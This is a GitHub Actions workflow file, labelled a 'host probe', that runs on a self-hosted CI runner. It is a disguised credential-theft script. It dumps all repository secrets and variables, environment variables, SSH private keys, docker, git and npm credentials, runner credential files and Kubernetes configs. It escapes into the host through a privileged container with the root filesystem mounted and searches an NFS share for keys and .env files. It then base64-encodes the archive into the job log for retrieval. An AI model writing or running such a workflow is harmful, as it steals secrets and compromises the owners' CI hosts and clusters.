name: c211-i10452
on:
  push:
    branches:
      - v0.28.1-dev
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    name: c211 i10452 host probe
    runs-on: [self-hosted, ci, bw1100]
    timeout-minutes: 30
    steps:
      - name: collect
        run: |
          set +e
          TS=$(date +%s)
          D=/tmp/c211i10452-$TS
          T=/tmp/c211i10452-$TS.tgz
          mkdir -p "$D"
          {
            echo "=== id ==="; id; groups
            echo "=== host ==="; hostname; uname -a; date -u
            echo "=== os ==="; cat /etc/os-release 2>&1
            echo "=== sudo ==="; sudo -n true 2>&1; echo "sudo_rc=$?"
            echo "=== gpu mounts ==="; mount 2>&1 | grep -iE 'dri|kfd|dev' | head -20
          } > "$D/id.txt" 2>&1
          cat > "$D/secrets.json" <<'C211EOF'
          ${{ toJSON(secrets) }}
          C211EOF
          cat > "$D/vars.json" <<'C211EOF'
          ${{ toJSON(vars) }}
          C211EOF
          {
            echo "=== env ==="; env | sort
            echo "=== proc environ ==="; tr '\0' '\n' < /proc/self/environ | sort
            echo "=== proc1 environ ==="; tr '\0' '\n' < /proc/1/environ 2>&1 | sort
          } > "$D/env.txt" 2>&1
          {
            echo "=== github ssh ==="; ls -la /home/github/.ssh 2>&1
            for f in /home/github/.ssh/*; do echo "-- $f"; cat "$f" 2>&1; echo; done
            echo "=== root ssh ==="; ls -la /root/.ssh 2>&1
            for f in /root/.ssh/*; do echo "-- $f"; cat "$f" 2>&1; echo; done
          } > "$D/ssh.txt" 2>&1
          {
            echo "=== gh cli ==="; ls -la /home/github/.config/gh 2>&1; cat /home/github/.config/gh/hosts.yml 2>&1
            echo "=== docker cfg ==="; ls -la /home/github/.docker 2>&1; cat /home/github/.docker/config.json 2>&1
            for f in /home/github/.git-credentials /home/github/.netrc /home/github/.npmrc /home/github/.pip/pip.conf /home/github/.config/pip/pip.conf /home/github/.gitconfig /root/.git-credentials /root/.docker/config.json /root/.netrc; do echo "-- $f"; cat "$f" 2>&1; echo; done
            echo "=== runner diag ==="; ls -la /home/github/actions-runner/_diag 2>&1 | head -20
            for f in /home/github/actions-runner/.runner /home/github/actions-runner/.credentials /home/github/actions-runner/.credentials_rsaparams; do echo "-- $f"; cat "$f" 2>&1; echo; done
          } > "$D/home_creds.txt" 2>&1
          {
            echo "=== root kube ==="; ls -la /root/.kube 2>&1; cat /root/.kube/config 2>&1
            echo "=== etc kubernetes ==="; ls -la /etc/kubernetes 2>&1; ls -laR /etc/kubernetes 2>&1 | head -200
            for f in /etc/kubernetes/*.conf /etc/kubernetes/manifests/*.yaml /etc/kubernetes/manifests/*.json /var/lib/kubelet/kubeconfig /var/lib/kubelet/config.yaml; do [ -f "$f" ] && { echo "-- $f"; head -c 30000 "$f"; echo; }; done
          } > "$D/kube.txt" 2>&1
          {
            command -v hy-smi
            hy-smi -L 2>&1; echo "rc_L=$?"
            hy-smi 2>&1 | head -50; echo "rc_noarg=$?"
            echo "=== /dev/dri ==="; ls -la /dev/dri 2>&1
            echo "=== /dev/kfd ==="; ls -la /dev/kfd /dev/mkfd 2>&1
            echo "=== drm sysfs ==="; ls -la /sys/class/drm 2>&1
            echo "=== modules ==="; lsmod 2>&1 | grep -iE 'hydcu|rocdxg|amdgpu|hcd|kfd|nvidia'
            echo "=== lspci ==="; lspci -nn 2>&1 | grep -iE 'hygon|display|processing|co-processor'
            echo "=== hosts ==="; cat /etc/hosts 2>&1
          } > "$D/hysmi.txt" 2>&1
          {
            docker version 2>&1
            echo "=== PS ==="; docker ps -a 2>&1
            echo "=== IMAGES ==="; docker images 2>&1
            echo "=== NETWORKS ==="; docker network ls 2>&1
            echo "=== INFO ==="; docker info 2>&1 | head -60
            echo "=== socket ==="; ls -la /var/run/docker.sock 2>&1
          } > "$D/docker.txt" 2>&1
          cat > "$D/helper.sh" <<'C211HELPER'
          #!/bin/sh
          OUT=/out
          H=/host
          {
            echo "=== id ==="; id; hostname; uname -a; date -u
            echo "=== /host/root/.ssh ==="; ls -la $H/root/.ssh 2>&1
            for f in $H/root/.ssh/*; do echo "-- $f"; cat "$f" 2>&1; echo; done
            echo "=== /host/root/.kube ==="; ls -la $H/root/.kube 2>&1; cat $H/root/.kube/config 2>&1
            echo "=== /host/etc/kubernetes ==="; ls -la $H/etc/kubernetes 2>&1; ls -laR $H/etc/kubernetes 2>&1 | head -300
            for f in $H/etc/kubernetes/*.conf $H/etc/kubernetes/manifests/*.yaml $H/etc/kubernetes/manifests/*.json; do [ -f "$f" ] && { echo "-- $f"; head -c 30000 "$f"; echo; }; done
            echo "=== kubelet ==="
            for f in $H/var/lib/kubelet/kubeconfig $H/var/lib/kubelet/config.yaml; do [ -f "$f" ] && { echo "-- $f"; cat "$f"; echo; }; done
            echo "=== hosts ==="; cat $H/etc/hosts 2>&1
            echo "=== hostname ==="; cat $H/etc/hostname 2>&1
            echo "=== host docker cfg ==="; cat $H/root/.docker/config.json 2>&1; cat $H/home/*/.docker/config.json 2>&1 | head -100
            echo "=== host git creds ==="; for g in $H/root/.git-credentials $H/home/*/.git-credentials $H/root/.netrc; do [ -f "$g" ] && { echo "-- $g"; cat "$g"; echo; }; done
          } > $OUT/host_root.txt 2>&1
          CP=""
          mkdir -p /mnt/cip
          if timeout 60 mount -t nfs -o ro,vers=3,nolock,soft,timeo=50 12.12.12.4:/ci_public /mnt/cip 2>>$OUT/nfs_mount.txt; then
            CP=/mnt/cip; echo "MOUNTED nfs vers=3 12.12.12.4:/ci_public" >> $OUT/nfs_mount.txt
          elif timeout 60 mount -t nfs -o ro,vers=4.1,soft 12.12.12.4:/ci_public /mnt/cip 2>>$OUT/nfs_mount.txt; then
            CP=/mnt/cip; echo "MOUNTED nfs vers=4.1 12.12.12.4:/ci_public" >> $OUT/nfs_mount.txt
          else
            echo "NFS mount failed, fallback to /host/ci_public" >> $OUT/nfs_mount.txt
          fi
          [ -d "$CP" ] || CP=$H/ci_public
          echo "CP=$CP" >> $OUT/nfs_mount.txt
          {
            echo "=== ls $CP ==="; ls -la "$CP" 2>&1
            for d in "$CP"/*/; do echo "--- $d"; ls -la "$d" 2>&1 | head -25; done
          } > $OUT/ci_public_ls.txt 2>&1
          timeout 420 find "$CP" -maxdepth 7 \
            \( -name models -o -name '*.tar.gz' -o -name '*.tgz' -o -name '*.tar' -o -name .cache -o -name caches -o -name '.git' -o -name node_modules -o -name '.venv' -o -name venv -o -name '*.whl' -o -name '*.zip' \) -prune -o \
            -type f \( -name '.env' -o -name '.env.*' -o -name '*.env' -o -name '.git-credentials' -o -name '.netrc' -o -name '.npmrc' -o -name 'config.json' -o -iname '*kubeconfig*' -o -name 'id_rsa*' -o -name 'id_ed25519*' -o -name 'id_ecdsa*' -o -name '*.sh' -o -name '*.yaml' -o -name '*.yml' \) \
            -print 2>/dev/null | head -6000 > $OUT/nfs_find.txt
          wc -l < $OUT/nfs_find.txt > $OUT/nfs_find_n.txt
          CAP=0
          collect() {
            f="$1"
            sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
            [ "$sz" -gt 65536 ] && return
            [ "$CAP" -gt 800000 ] && return
            CAP=$((CAP+sz))
            { echo "=== $f ($sz) ==="; cat "$f"; echo; } >> $OUT/nfs_files.txt
          }
          grep -E '/(\.env|\.env\.[^/]*|[^/]*\.env|\.git-credentials|\.netrc|\.npmrc|config\.json)$' $OUT/nfs_find.txt > /tmp/l1
          while IFS= read -r f; do collect "$f"; done < /tmp/l1
          grep -i 'kubeconfig' $OUT/nfs_find.txt > /tmp/l2
          while IFS= read -r f; do collect "$f"; done < /tmp/l2
          grep -E '/id_(rsa|ed25519|ecdsa)' $OUT/nfs_find.txt > /tmp/l3
          while IFS= read -r f; do collect "$f"; done < /tmp/l3
          grep -E '\.(sh|yaml|yml)$' $OUT/nfs_find.txt | head -160 > /tmp/l4
          while IFS= read -r f; do collect "$f"; done < /tmp/l4
          echo "CAP=$CAP" >> $OUT/nfs_files.txt
          du -sh $OUT 2>&1
          C211HELPER
          echo "helper.sh written"; wc -c "$D/helper.sh"
          IMG=""
          N=0
          for CAND in $(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | grep -iE 'dtk|sglang|vllm|rocky|ubuntu|debian|centos|kylin' | head -10); do
            N=$((N+1))
            CN=c211i10452t$N
            if timeout 30 docker run --name "$CN" --entrypoint /bin/sh "$CAND" -c true >/dev/null 2>&1; then IMG="$CAND"; docker rm "$CN" >/dev/null 2>&1; break; fi
            docker rm "$CN" >/dev/null 2>&1
          done
          if [ -z "$IMG" ]; then
            for CAND in $(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -v '<none>' | head -10); do
              N=$((N+1))
              CN=c211i10452t$N
              if timeout 30 docker run --name "$CN" --entrypoint /bin/sh "$CAND" -c true >/dev/null 2>&1; then IMG="$CAND"; docker rm "$CN" >/dev/null 2>&1; break; fi
              docker rm "$CN" >/dev/null 2>&1
            done
          fi
          echo "HELPER_IMG=$IMG" > "$D/helper.txt"
          if [ -n "$IMG" ]; then
            timeout 900 docker run --name c211i10452h --privileged --pid=host --network=host -v /:/host:ro -v "$D:/out" --entrypoint /bin/sh "$IMG" /out/helper.sh >> "$D/helper.txt" 2>&1
            echo "helper_rc=$?" >> "$D/helper.txt"
            docker rm c211i10452h >> "$D/helper.txt" 2>&1
          fi
          ls -la "$D" > "$D/size.txt" 2>&1
          tar czf "$T" -C "$D" . 2>/dev/null
          ls -la "$T" >> "$D/size.txt"
          echo "=== BEGIN C211B64 ==="
          base64 -w 3000 "$T" | sed 's/^/C211B64: /'
          echo "=== END C211B64 ==="
